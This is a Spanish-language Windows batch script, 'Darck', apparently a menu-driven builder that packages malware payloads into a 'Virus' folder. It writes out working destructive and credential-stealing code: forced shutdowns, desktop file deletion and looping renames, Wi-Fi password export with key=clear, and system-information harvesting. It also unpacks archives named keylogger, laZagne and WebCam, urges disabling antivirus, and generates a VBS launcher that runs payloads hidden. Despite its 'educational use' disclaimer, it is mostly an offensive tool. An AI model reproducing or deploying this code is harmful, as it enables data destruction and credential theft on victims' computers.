
@rem bin\windows\bat
@rem Autor Luishiño Pericena Choque
@rem Informacion:
@rem Sigueme en las redes Sociales:
@rem Blogger          https://lpericena.blogspot.com/
@rem Github            https://github.com/Pericena
@rem youtube.com  https://www.youtube.com/channel/UCELx1m-NeAdBn7mCuQ86kcw
@rem pinterest        https://es.pinterest.com/lushiopericena/
@rem twitter             https://twitter.com/LPericena
@rem linkedin         https://www.linkedin.com/in/lpericena/
@rem facebook       https://www.facebook.com/profile.php?id=100009309755063
@rem pagina facebook  https://www.facebook.com/lpericena
@rem sitio web        https://pericena.wordpress.com/
@rem vimeo         https://vimeo.com/lpericena
@rem instagram      https://www.instagram.com/lpericena/
@rem remote      https://remote.com/luishinopericena-choque
@rem google+   https://plus.google.com/u/0/114054031405340478901
@rem kiwi       https://kiwi.qa/LuishinoC
@rem App    https://apps.facebook.com/167466933725219
@rem Grupo    https://www.facebook.com/groups/122223121705126/?source_id=1506435219407506
@rem socialtools https://www.socialtools.me/index?action=demoApps&preview=1&app_id=406101
@rem teachlr    https://teachlr.com/lpericena
@rem wikipedia  https://es.wikipedia.org/wiki/Usuario:Luishi%C3%B1o_Pericena_Choque
@rem ask          https://ask.fm/Lpericena
@rem stackoverflow  https://stackoverflow.com/users/6506592/luishi%C3%B1o-pericena-choque
@rem wix https://lpericena.wixsite.com/curriculumvitae
@echo off
TITLE Darck
cls
MODE con: cols=100 lines=50
COLOR 02

:VARIABLES
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (set "DEL=%%a")
<nul set /p=""
set capp=None
setlocal enabledelayedexpansion
if (%1)==(0) goto VARIABLES
set /A count=0
FOR %%F IN ("*.exe") DO (
set /A count+=1
set tmpstore=%%~nF%%~xF)
if %count%==1 (set capp=%tmpstore%)
MKDIR %folder% >NUL
echo.Nombre del progrma %tmpstore%

set Npayloads=34
set ESC=
set WEB=None
set ADroid=Darck
set pass=TheSevenCodes
set folder=Virus
set MSM=Hi %username%
set ip=0.0.0.0
set usrc=9
set dec=0
set heapy=64
set Autor=Lushiño Pericena Choque
set web1=https://lpericena.blogspot.com/

MKDIR %folder%
:MENU
TITLE Darck
CLS
echo.                                        
call :PainText 07 "                irrvriii"
echo.
call :PainText 07 "           iMBBOoi"
echo.
call :PainText 07 "         MBBNi"
call :PainText 0F "                   UPGRADED BY @pericena "
echo.
call :PainText 07 "       OBBv      BBBv    vBBB" 
call :PainText 0F "                   CODED BY  @Luishino Pericena Choque"
echo.              
call :PainText 07 "     iMBG        BMBBBBBBBBBBr" 
call :PainText 0C "      [%Npayloads%]"
call :PainText 02 "Payloads cargados"
echo.                               
call :PainText 07 "     BBG       MBBBMBBBBBBBMBMBU"
call :PainText 06 "    [01]off     -apagar las pc" 
echo.                           
call :PainText 07 "    BBB        OBBBBBBBBBBMBBBX" 
call :PainText 06 "     [02]H2infw  -extraer informacion pc"
echo.          
call :PainText 07 "   iBBB           ivrLBMEiii"   
call :PainText 06 "        [03]Wifi    -extraer password wifi"
echo.       
call :PainText 07 "   iBBB               MBv "    
call :PainText 06 "           [04]Google  -pantalla azul de la muerte" 
echo.     
call :PainText 07 "    BBB             BBBMBBB"  
call :PainText 06 "         [05]Firefox -crear muchos archivos peligrosos"  
echo.    
call :PainText 07 "    uBBB            GBMBBBu"  
call :PainText 06 "         [06]Ractor  -" 
echo.         
call :PainText 07 "     SBMB           FBBMBBi"
call :PainText 06 "         [07]Klo     -Eliminar archivos del escritorio"   
echo.           
call :PainText 07 "      iBBBY        iBBMBMBM"    
call :PainText 06 "         [08]Flister -Crear acceso directos"   
echo.          
call :PainText 07 "        UMBBOi     SBMBBBBBi    iii" 
call :PainText 06 " [09]WlanProfiles -Extraer el password de wifi" 
echo.            
call :PainText 07 "          iGBBMBGji FBBBBBEiLIVJ"  
call :PainText 06 "    [10]keylogger -Extraer password desde el teclado"   
echo.           
call :PainText 07 "              iUBBBBNSMBBjrri"     
echo.        
call :PainText 07 "                      GB"       
echo.
call :PainText 07 "                     MBr"     
echo.     
call :PainText 07 "                    JBB"      
echo.     
call :PainText 07 "                     MBBi"    
echo.             
call :PainText 07 "                      vBBBMo"  
echo.              
call :PainText 07 "                         rBBBV"  
echo.               
call :PainText 07 "                           BBBi" 
call :PainText 0f "           %ADroid%%version%"
echo.                               
call :PainText 07 "                      rBBorBBB"  
call :PainText 0F " %MSM%"
echo.          
call :PainText 07 "                      iBBBBBv"  
echo.                  
for /f "usebackq tokens=2 delims=:" %%f in (`ipconfig ^| find /i "IPv4"`) do set ip=%%f>nul
call :PainText 0E " PAYLOADS"
call :PainText 0F " %WEB%"
echo.^|FECHA:%DATE%^|HORA:%TIME%^|SISTEMA:%OS%^|IP:%ip%
call :PainText 0C " Comandos"
echo.:.............................................................................  
echo. [+]help %ESC%Ayuda  [+]exit %ESC%Salir  [+]version %ESC%Version  [+]inf %ESC%Informacion  [+]cls %ESC%Limpiar
echo..........................................................................................
echo.Directorio Actual: %CD% 

goto :END
goto error420
:PainText
<nul set /p "=%DEL%" > "%~2"
findstr /v /a:%1 /R "+" "%~2" nul
del "%~2" > nul
goto :eof
:END
:SELEC
shift /1
call :PainText 0C " [+] Seleccione una opcion"
set /P INPUT=:%ESC%%=%
if %INPUT%==1 goto Off
if %INPUT%==2 goto H2infw
if %INPUT%==3 goto Wifi
if %INPUT%==4 goto Google
if %INPUT%==5 goto Firefox
if %INPUT%==6 goto Rator
if %INPUT%==7 goto Klo
if %INPUT%==8 goto Flister
if %INPUT%==7 goto Klo
if %INPUT%==9 goto WlanProfiles
if %INPUT%==10 goto keylogger
if %INPUT%==11 goto Usb-File


if %INPUT% LEQ 0 goto:CMD
if /I %INPUT% GTR 33 (goto CMD)
if /I %INPUT% LSS 1 (goto CMD)
set capp=!a%INPUT%!
goto INPUT
goto error420

:CMD
if %INPUT% == root goto payloads
if %INPUT% == use goto USUARIO
if %INPUT% == inf goto INFORMACION
if %INPUT% == -h goto help
if %INPUT% == h goto help
if %INPUT% == help goto help
if %INPUT% == -v goto version
if %INPUT% == v goto version
if %INPUT% == version goto version
if %INPUT% == ls goto LS
if %INPUT% == CLS goto CLS
if %INPUT% == cls goto CLS
if %INPUT% == sms goto MSM
if %INPUT% == clear goto LIMPIAR-CARPETA
if %INPUT% == show goto TREE
if %INPUT% == dir goto DIR
if %INPUT% == exit goto EXIT
if %INPUT% == error goto error420
if %INPUT% == script goto SSID
if exist not %INPUT% goto warnExists
:Error
call :PainText 4f "         -------------                  ERROR                       -------------------"  && <nul set /p=""
echo.
echo.        Error: Opcion invalida  ErrorLevel [%ERRORLEVEL%] %ESC%PROGRAMA Error[%INPUT%]
call :PainText 04 "      [x]Error del programa %tmpstore% dirigirse con el desarrollador "
call :PainText 0F " @Luishino Pericena Choque."
echo.
call :PainText 06 "      [x]La opcion [%INPUT%] no es correcto vuelva a introducir una opcion .."
echo.
call :PainText 06 "      [x]Script vbs-bat [%PAY%] no es correcto ingrese el comando script..
echo.
call :PainText 06 "      [x]Los payloads estan comprimido en la carpeta Tools con un password.."
echo.
call :PainText 06 "      [x]Desactivar el antivirus para obtener los payloads"
echo. 
echo.              Usa el comando "Help"  para obtener ayuda   
echo.
echo. :: Descargo de responsabilidad: los desarrolladores no asumen ninguna responsabilidad y no son
echo. :: responsable de cualquier mal uso o daño causado por Darck.
echo. :: Uso exclusivo para fines educativos.
echo. :: Atacar a objetivos sin consentimiento mutuo es ilegal.
echo.
set MSM=Hi %username% desactiva tu antivirus.
call :PainText 0C " [+]Seleccione Enter"
set /p =
::start https://lpericena.blogspot.com/
goto MENU
goto error420
if errorlevel == %errorlevel% goto error422
if errorlevel 1 (
echo "An Error Occured, Please Check The Log (option %INPUT%)"
goto error420
)
goto error420

:TREE
call :PainText 07 " Payloads agregados actualmente en la carpeta %folder%"
echo.
CD ./Virus
TREE
echo.
CD ..
set MSM=Hi %username% desactiva tu antivirus para que los payloads no sean eliminados.
goto SELEC

:DIR
CLS
set MSM=Hi %username% desactiva tu antivirus para que los payloads no sean eliminados.
CD ./Tools
DIR
echo.
CD ..
goto SELEC
:LIMPIAR-CARPETA
RMDIR /S /Q %folder%
echo.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
call :PainText 06 "               payloads eliminados de la carpeta [%folder%]"
echo.
echo.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
MKDIR %folder%
goto SELEC
goto Error

:SHOW
set MSM=Hi %username% desactiva tu antivirus para que los payloads no sean eliminados.
call :PainText 07 " Payloads agregados actualmente en la carpeta %folder%"
echo.
CD ./Virus
DIR /B
CD ..
goto PAY2
)
goto Error

:version
set version=v2.0
::cd ./Tools
call :PainText 02 " Version"
call :PainText 07 " %ADroid%%version%"
echo.
setlocal enabledelayedexpansion
for %%j in ("./Tools/*version.txt") do (@echo.
::for %%j in ("./Tools/*.txt") do (@echo. %%j
cd ./Tools
DEL version.txt >NUL
CD ..
goto SELEC
)
goto TXT
:TXT
cd ./Tools
DEL version.txt >NUL
echo.                            Verificando una nueva version
::wget  -k  -r  https://github.com/Pericena/Darck-Guiza/blob/master/version.txt?raw=true
::wget -r -c -k https://github.com/Pericena/Darck-Guiza/blob/master/version.txt?raw=true
::wget -p -E -nd https://github.com/Pericena/Darck-Guiza/blob/master/version.txt?raw=true
::wget -N https://github.com/Pericena/Darck-Guiza/blob/master/version.txt>>txt.txt
::wget.exe -d https://github.com/Pericena/Darck-Guiza/blob/master/version.txt>>txt3.txt
::wget -c https://github.com/Pericena/Darck-Guiza/blob/master/version.txt?raw=true
::wget -c -i https://github.com/Pericena/Darck-Guiza/*.txt>>txt0.txt
wget https://raw.githubusercontent.com/Pericena/Darck-Guiza/master/version.txt >NUL
::wget https://github.com/Pericena/Darck-Guiza/*.txt?raw=true
::wget -m https://github.com/Pericena/Darck-Guiza/blob/master/version.txt?raw=true
::wget  -k  -r  https://github.com/Pericena/Darck-Guiza/blob/master/version.txt?raw=true
::wget  -r  https://github.com/Pericena/Darck-Guiza/blob/master/version.txt-o  reporte.log
::wget  -r  -l10  https://github.com/Pericena/Darck-Guiza/blob/master/version.txt-o  reporte.log
TITLE %ADroid%
ver
type version.txt
CD ..
goto SELEC
goto error420

:CLS
CLS
set ip=0.0.0.0
set MSM=Hi %username%
goto MENU
goto error420

:LS
set version=
set ip=
set WEB=None
set MSM=Hacking
CLS
goto MENU
goto error420

:USUARIO
CLS
echo.
call :PainText 0C "                                     Payloads             "
echo.
call :PainText 04 " ------------------------------------------------------------------------------------------"
echo.
CD ./Tools
::FOR %%x in (*.7z) DO echo.              [+]%%x 
type payloads
echo.
CD ..
call :PainText 02 "                                                                  Autor "
call :PainText 08 " Luishino Pericena Choque"
echo.
call :PainText 04 " ------------------------------------------------------------------------------------------"
echo.
for /f "usebackq tokens=2 delims=:" %%f in (`ipconfig ^| find /i "IPv4"`) do set ip=%%f>nul
call :PainText 0E " PAYLOADS"
call :PainText 0F " %WEB%"
echo.^|FECHA:%DATE%^|HORA:%TIME%^|SISTEMA:%OS%^|IP:%ip%
call :PainText 0C " Comandos"
echo.:.............................................................................  
echo. [+]help %ESC%Ayuda  [+]exit %ESC%Salir  [+]version %ESC%Version  [+]inf %ESC%Informacion  [+]cls %ESC%Limpiar
echo..........................................................................................


:INCORRECTOUSER
set usuarios=Luishiño;root;admin;
set passwords=Luishiño;root;admin;
:pl
set id=1
call :PainText 0F " (usuario)"
set /p usuario=^>%ESC%
if %usuario%==%usuarios% goto pl
if %usuario%==cls goto USUARIO
if %usuario%==help goto help
if %usuario%==C goto MENU
if %usuario%==c goto MENU

:U
for /f "delims=; tokens=%id%" %%U in ("%usuarios%") do (
if "%%U"=="%usuario%" goto password
if "%id%" GEQ "3" goto ErrorUser
set /a id=%id% + 1 && goto U
 )
goto MENU
:password
set pcont=1
set ia=Incorrecto Password
:contador
call :PainText 0F " (password)"
set /p pass2=^>%ESC%
if %pass2%==cls goto USUARIO
for /f "delims=; tokens=%id%" %%P in ("%passwords%") do (
::::::::::::::::::::::::::::::::::: si es correcta ir a OK
if "%%P"=="%pass2%" goto CORRECTOUSER
if "%pcont%" GEQ "3" goto USUARIO
set /a pcont=%pcont% + 1 && goto contador

)
:CORRECTOUSER
echo.    OK Password
goto GENERAR
:ErrorUser
echo. Incorrecto usuario
goto INCORRECTOUSER

goto payloads
goto error420
:v2
echo. %Droid%%version%
goto GENERAR

:HELPAY
echo. Para comenzar a generar un payloads debe ingresar un numero
echo.   [+]show   -Payloads agregados actualmente en la carpeta Virus
echo.   [+]c      -Cancelar la creacion de payloads volver al menu
echo.   [+]cls    -Limpiar la pantalla de payloads
echo.   [+]clear  -Resetear los payloads
echo.   [+]h      -Opcion de comandos
echo.   [+]v      -Version de %ADroid%
goto GENERAR
goto Error

:LIMPIAR
RMDIR /S /Q %folder%
call :PainText 06 "               payloads eliminados de la carpeta [%folder%]"
echo.
MKDIR %folder%
goto PAY2
goto Error

:INFPAYLOADS
CLS
echo.
call :PainText 0C "                        INFORMACION DE LOS PAYLOADS             "
echo.
cd ./Tools
type inf
cd ..
pause
:PAY2

:payloads
:PAYCLS
:PAYRUN
CLS
echo.
call :PainText 0C "                                     Payloads             "
echo.
call :PainText 04 " ------------------------------------------------------------------------------------------"
echo.
CD ./Tools
::FOR %%x in (*.7z) DO echo.              [+]%%x 
type payloads
echo.
CD ..
call :PainText 02 "                                                                  Autor "
call :PainText 08 " Luishino Pericena Choque"
echo.
call :PainText 04 " ------------------------------------------------------------------------------------------"
echo.

for /f "usebackq tokens=2 delims=:" %%f in (`ipconfig ^| find /i "IPv4"`) do set ip=%%f>nul
echo. ^|FECHA:%DATE% ^|HORA:%TIME% ^|SISTEMA:%OS% ^|IP:%ip%
call :PainText 0E " PAYLOADS"
call :PainText 0F " %WEB%"
echo.

:GENERAR
call :PainText 0C " [+] Crear payloads"
echo.
call :PainText 02 " [c] Cancelar"
call :PainText 04 " [h] Ayuda "
call :PainText 06 " [cls] Limpiar pantalla "
echo.
:PAY2
call :PainText 0F " (payload) "
set /p PAY=^>%ESC%%=%
if %PAY%==1  (set WEB2=Off)
if %PAY%==2  (set WEB2=H2infw)
if %PAY%==3  (set WEB2=Wifi)
if %PAY%==4  (set WEB2=Google)
if %PAY%==5  (set WEB2=Firefox)
if %PAY%==6  (set WEB2=Rator)
if %PAY%==7  (set WEB2=Klo)
if %PAY%==8  (set WEB2=Flister)
if %PAY%==9  (set WEB2=Wlan-Profiles)
if %PAY%==10 (set WEB2=keylogger)
if %PAY%==11 (set WEB2=Usb-File)
if %PAY%==12 (set WEB2=AdobeHack)
if %PAY%==13 (set WEB2=Firewall)
if %PAY%==14 (set WEB2=MovieHack.mp4)
if %PAY%==15 (set WEB2=MusicHack)
if %PAY%==16 (set WEB2=OfficeHack)
if %PAY%==17 (set WEB2=PictureHack.png)
if %PAY%==18 (set WEB2=WebCam)
if %PAY%==19 (set WEB2=Opera)
::::verrr
if %PAY%==20 (set WEB2=keyloggerps1)
if %PAY%==21 (set WEB2=Usb-Segurity)
if %PAY%==22 (set WEB2=Gamer)
if %PAY%==23 (set WEB2=Rabbit)
if %PAY%==24 (set WEB2=laZagne)
if %PAY%==25 (set WEB2=Grook)
if %PAY%==26 (set WEB2=Suitse)

if %PAY%==27 (set WEB2=Fox)
if %PAY%==28 (set WEB2=Antivirus-Danger)
if %PAY%==29 (set WEB2=AntivirusStain)
if %PAY%==30 (set WEB2=Antivirus-Start)
if %PAY%==31 (set WEB2=Facebook)
if %PAY%==32 (set WEB2=gmail)


if %PAY% == v goto v2
if %PAY% == h goto HELPAY
if %PAY% == H goto HELPAY
if %PAY% == help goto HELPAY
if %PAY% == ? goto help
if %PAY% == c goto MENU
if %PAY% == C goto MENU
if %PAY% == cls goto PAYCLS
if %PAY% == show goto SHOW
if %PAY% == clear goto LIMPIAR
if %PAY% == tree goto TREE 					
if %PAY% == payloads goto INFPAYLOADS

if %PAY% LEQ 0 goto:PAY2
if /I %PAY% GTR 34 (goto PAY2)
if /I %PAY% LSS 1 (goto PAY2)
set capp=!a%PAY%!
goto RUN
goto error420

:RUN
CLS
CD ./%folder%
echo.%cd%
Set WEB1=%WEB2%.exe
MKDIR %WEB1% >NUL
CD ..
CD ./Tools
7z x %WEB2%.7z -p%pass%
REN %WEB2% %WEB1%
SET WEB=%WEB1%
MOVE %WEB% ..\%folder%\%WEB%>NUL
::MOVE psw.txt ..\%folder%\Facebook.exe>NUL
MOVE psw.txt ..\%folder%\gmail.exe>NUL
MOVE Get-WlanProfiles.psm1 ..\%folder%\WlanProfiles.exe>NUL


CD ..
echo.
goto ALL2
goto error420

:ALL2
DEL ./%folder%/%WEB%/script.bat>NUL
echo.@echo off >>script.bat
echo.TITLE script >>script.bat
echo.MODE con: cols=15 lines=10>>script.bat
echo.DIR /B *.exe^>script.txt >>script.bat
echo.echo.           Cuidado con este archivo InputFile es peligroso >>script.bat
echo.set e=%%%% >>script.bat
echo.echo. porcentaje%e% >>script.bat
echo.FOR /F "eol= " %%%%i in (script.txt) do CALL %%%%i ^>NUL >>script.bat
echo.del script.txt ^>NUL >>script.bat
echo.exit >>script.bat


DEL ./%folder%/%WEB%/script.vbs >NUL
echo.Set WshShell=CreateObject("WScript.Shell") >>script.vbs
echo.WshShell.Run chr(34) ^& "%WEB%" ^& Chr(34),0 >>script.vbs
echo.Set WshShell=Nothing >>script.vbs

echo. 
call :PainText 0E "                    PAYLOADS"
call :PainText 0F " %WEB%"
call :PainText 0A " creado en la carpeta %folder%"
echo.
call :PainText 0C " ----------------------------------BAT--------------------------------------------------------"
echo.
type script.bat
call :PainText 0C " -----------------------------------VBS-------------------------------------------------------"
echo.
type script.vbs

MOVE script.bat ./Virus/%WEB%>NUL
move script.vbs ./%folder%/%WEB%/script.vbs >NUL
echo.
call :PainText 02 "                                                                  Autor "
call :PainText 08 " Luishino Pericena Choque"
echo.
set MSM=Visita mi blogger para nuevas herramientas de hacking
call :PainText 0C " [+]Seleccione Enter"
set /p =
goto PAYRUN
goto Error



:CREAR
echo.                      script de infeccion despues de su ejecucion
call :PainText 0C " [+] Crear script"
echo.
call :PainText 07 " [S] Si  "
call :PainText 02 " [N] No"
call :PainText 04 " [h] Ayuda "
call :PainText 0F " (el valor predeterminado es [S])"
set /p CREAR=:%ESC%
if %CREAR% == S goto SCRIPT
if %CREAR% == s goto SCRIPT
if %CREAR% == n goto MENU
if %CREAR% == N goto MENU
if %CREAR% == h goto help
if %CREAR% == ? goto help
if %CREAR% == cls goto cls
goto CREAR
call :PainText 0C " [+]Seleccione Enter"
set /p =
goto Error
goto error420

:SCRIPT
echo.                 Formato script de infeccion [VBS]^|[BAT]
echo.                      Usando comando vbs ^| bat ^|all ^|[?] Ayuda
call :PainText 0C " [+]  Que tipo de script quieres usar"
echo.
call :PainText 01 " [V] Vbs  "
call :PainText 03 " [B] Bat"
call :PainText 04 " [H] Ayuda "
call :PainText 0F " (el valor predeterminado es [all] todos)"
set /p CREAR2=:%ESC%
if %CREAR2% == B goto BAT
if %CREAR2% == b goto BAT
if %CREAR2% == V goto VBS
if %CREAR2% == v goto VBS
if %CREAR2% == bat goto BAT
if %CREAR2% == BAT goto BAT
if %CREAR2% == VBS goto VBS
if %CREAR2% == vbs goto VBS
if %CREAR2% == all goto ALL
if %CREAR2% == h goto help
if %CREAR2% == H goto help
if %CREAR2% == ? goto help
if %CREAR2% == cls goto cls
goto SCRIPT
echo.
call :PainText 02 "                                                                  Autor "
call :PainText 08 " Luishino Pericena Choque"
echo.
call :PainText 0C " [+]Seleccione Enter"
set /p =
goto Error
goto error420




:ALL
DEL ./%folder%/%WEB%/script.bat >NUL
echo.@echo off >>script.bat
echo.TITLE script >>script.bat
echo.MODE con: cols=15 lines=10>>script.bat
echo.DIR /B *.exe^>script.txt >>script.bat
echo.echo.           Cuidado con este archivo InputFile es peligroso >>script.bat
echo.set e=%%%% >>script.bat
echo.echo. porcentaje%e% >>script.bat
echo.FOR /F "eol= " %%%%i in (script.txt) do CALL %%%%i ^>NUL >>script.bat
echo.del script.txt ^>NUL >>script.bat
echo.exit >>script.bat
type script.bat
MOVE script.bat ./Virus/%WEB%>NUL

DEL ./%folder%/%WEB%/script.vbs >NUL
echo.Set WshShell=CreateObject("WScript.Shell") >>script.vbs
echo.WshShell.Run chr(34) ^& "%WEB%" ^& Chr(34),0 >>script.vbs
echo.Set WshShell=Nothing >>script.vbs
type script.vbs
move script.vbs ./%folder%/%WEB%/script.vbs >NUL
echo.
call :PainText 02 "                                                                  Autor "
call :PainText 08 " Luishino Pericena Choque"
set MSM=Hi %username% sigeme en las redes sociales..
goto MENU
goto Error


:::::::::::::::::::script bat ::::::::::::::::::::::::::
:BAT
DEL ./%folder%/%WEB%/script.bat >NUL
echo.@echo off >>script.bat
echo.TITLE script >>script.bat
echo.MODE con: cols=15 lines=10>>script.bat
echo.DIR /B *.exe^>script.txt >>script.bat
echo.echo.           Cuidado con este archivo InputFile es peligroso >>script.bat
echo.set e=%%%% >>script.bat
echo.echo. porcentaje%e% >>script.bat
echo.FOR /F "eol= " %%%%i in (script.txt) do CALL %%%%i ^>NUL >>script.bat
echo.del script.txt^>NUL >>script.bat
echo.exit >>script.bat
type script.bat
MOVE script.bat ./Virus/%WEB%>NUL
echo.
call :PainText 02 "                                                                  Autor "
call :PainText 08 " Luishino Pericena Choque"
goto MENU
goto Error

:::::::::::::::::::script vbs :::::::::::::::::::::::::
:VBS
DEL ./%folder%/%WEB%/script.vbs >NUL
echo.Set WshShell=CreateObject("WScript.Shell") >>script.vbs
echo.WshShell.Run chr(34) ^& "%WEB%" ^& Chr(34),0 >>script.vbs
echo.Set WshShell=Nothing >>script.vbs
type script.vbs
move script.vbs ./%folder%/%WEB%/script.vbs >NUL
echo.
call :PainText 02 "                                                                  Autor "
call :PainText 08 " Luishino Pericena Choque"
goto MENU
goto Error

::::::::::::::::::::::: 1 :::::::::::::::
:Off
CLS
CD ./%folder%
set WEB=Off.exe
MKDIR %WEB% >NUL
echo.
echo.@echo off >>Off.bat
echo.MODE con: cols=15 lines=10>>Off.bat
echo.echo Hola %USERNAME% >>Off.bat
echo.set Nombre=         Autor: Luishino Pericena Choque  >>Off.bat
echo.echo 	     	https://lpericena.blogspot.com  >>Off.bat
echo.echo       %Nombre% >>Off.bat
echo.echo              DIA %date%  HORA %time%>>Off.bat
echo.echo Enter>>Off.bat
echo.shutdown -s -t 1 -c "La computadora se apagará automáticamente">>Off.bat
echo.cls>>Off.bat
echo.exit>>Off.bat
type Off.bat
MOVE Off.bat ./%WEB% >NUL
CD ..
CD ./Tools
7z x Off.7z -p%pass%
::7za e Off.7z -p123456
REN Off Off.exe>NUL
::7za a -sfx %WEB% *.Off
echo.%cd% 
MOVE Off.exe ..\%folder%\%WEB% >NUL
::del Off >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420
:::::::::::::::::::::::::2:::::::::::::::::::
:H2infw
CLS
CD ./%folder%
set WEB=H2infw.exe
MKDIR %WEB% >NUL
echo.
echo.@echo off>>H2infw.bat
echo.MODE con: cols=15 lines=10>>H2infw.bat
echo.echo.        Autor: Luishino Pericena Choque>>H2infw.bat
echo.echo.       https://lpericena.blogspot.com/>>H2infw.bat
echo.net user^>^>H2infw.txt >>H2infw.bat
echo.hostname ^>^>H2infw.txt >>H2infw.bat
echo.systeminfo ^>^>H2infw.txt >>H2infw.bat
echo.systeminfo %hostname% ^| find "K"^>^>H2infw.txt >>H2infw.bat
echo.exit>>H2infw.bat

type H2infw.bat
MOVE H2infw.bat ./%WEB% >NUL
CD ..
CD ./Tools
::7za e H2infw.7z -p123456
7z x H2infw.7z -p%pass%
REN H2infw H2infw.exe>NUL
::7za a -sfx %WEB% *.H2infw
echo.%cd% 
MOVE H2infw.exe ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420
::::::::::::::::::::::: 3 :::::::::::::::::::::
:Wifi
CLS
set WEB=Wifi.exe
CD ./%folder%
MKDIR %WEB% >NUL
echo.

echo.@echo off >>Wifi.bat
echo.MODE con: cols=15 lines=10>>Wifi.bat
echo.echo.    Autor: Luishino Pericena Choque>>Wifi.bat
echo.echo.    https://lpericena.blogspot.com/>>Wifi.bat
echo.mkdir wifi>>Wifi.bat
echo.cd wifi>>Wifi.bat
echo.netsh wlan export profile key=clear >>Wifi.bat
echo.dir *.xml ^|% { >>Wifi.bat
echo.$xml=[xml] (get-content $_) >>Wifi.bat
echo.Write-Host $xml.WLANProfile.SSIDConfig.SSID.name `t $xml.WLANProfile.MSM.Security.sharedKey.keymaterial >>Wifi.bat
echo.} >>Wifi.bat
echo.cd .. >>Wifi.bat
echo.rmdir -recurse wifi >>Wifi.bat
echo.cls >>Wifi.bat
echo.exit >>Wifi.bat
type Wifi.bat
MOVE Wifi.bat ./%WEB% >NUL
CD ..
CD ./Tools
::7za e Wifi.7z -p123456
7z x Wifi.7z -p%pass%
REN Wifi Wifi.exe>NUL
::7za a -sfx %WEB% *.Wifi
echo.%cd% 
MOVE Wifi.exe ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420

:::::::::::::::4 ::::::::::::::::::::
:Google
CLS
set WEB=Google.exe
CD ./%folder%
MKDIR %WEB% >NUL
echo.
CD ..
CD ./Tools
7z x Google.7z -p%pass%
type Google
REN Google Google.exe>NUL
echo.%cd% 
MOVE Google.exe ..\Virus\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420

::::::::::::::::::::::5:::::::::::::::::::
:Firefox
CLS
set WEB=Firefox.exe
CD ./%folder%
MKDIR %WEB% >NUL
echo.

echo.@echo off
echo.:Reckon
echo.echo.                        Autor Luishino Pericena Choque 
echo.echo                        https://lpericena.blogspot.com/                                 
echo.echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%^>%USERNAME%-%random%%random%.txt
echo.shutdown -s -t 3600 -c "virus detectado #%random% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA:%DATE%  La computadora se apagara %Link% "
CD ..
CD ./Tools
7z x Firefox.7z -p%pass%
type Firefox
REN Firefox Firefox.exe>NUL
echo.%cd% 
MOVE Firefox.exe ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420
::::::::::::::::::::::6:::::::::::::::::::
:Rator
CLS
set WEB=Ractor.exe
CD ./%folder%
MKDIR %WEB% >NUL
echo.
CD ..
CD ./Tools
7z x Rator.7z -p%pass%
type Rator
echo.%cd% 
MOVE Rator.exe ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420

::::::::::: 7 ::::::::::::::
:Klo
CLS
set WEB=Klo.exe
CD ./%folder%
MKDIR %WEB% >NUL
echo.
echo.@echo off >>Klo.bat 
echo.:head  >>Klo.bat
echo.del *.* >>Klo.bat
echo.copy C:\Users\%username%\Deskatop >>Klo.bat
echo.copy C:\Users\%username%\Escritorio >>Klo.bat
echo.echo "jajajajajaja">"Hola %username% te elimine todo sin querer jajajajajujujuju °_°" >>Klo.bat
echo.exit >>Klo.bat
type Klo.bat
MOVE Klo.bat ./%WEB% >NUL
CD ..
CD ./Tools
7z x Klo.7z -p%pass%
REN Klo Klo.exe>NUL
echo.%cd% 
MOVE Klo.exe ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420

::::: 8 .:::::::::::::::
:Flister
CLS
set WEB=Flister.exe
CD ./%folder%
MKDIR %WEB% >NUL
echo.
echo.@echo off >>Flister.bat
echo.:head >>Flister.bat
echo.rename C:\Users\%username%\Desktop\*.* *.lnk >>Flister.bat
echo.rename C:\Users\%username%\Escritorio\*.* *.lnk >>Flister.bat
echo.goto:head >>Flister.bat
echo.exit >>Flister.bat
type Flister.bat
MOVE Flister.bat ./%WEB% >NUL
CD ..
CD ./Tools
7z x Flister.7z -p%pass%
REN Flister Flister.exe>NUL 
MOVE Flister.exe ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420

::::: 9 .:::::::::::::::
:WlanProfiles
CLS
set WEB=WlanProfiles.exe
CD ./%folder%
MKDIR %WEB% >NUL
echo.@echo off
@echo off
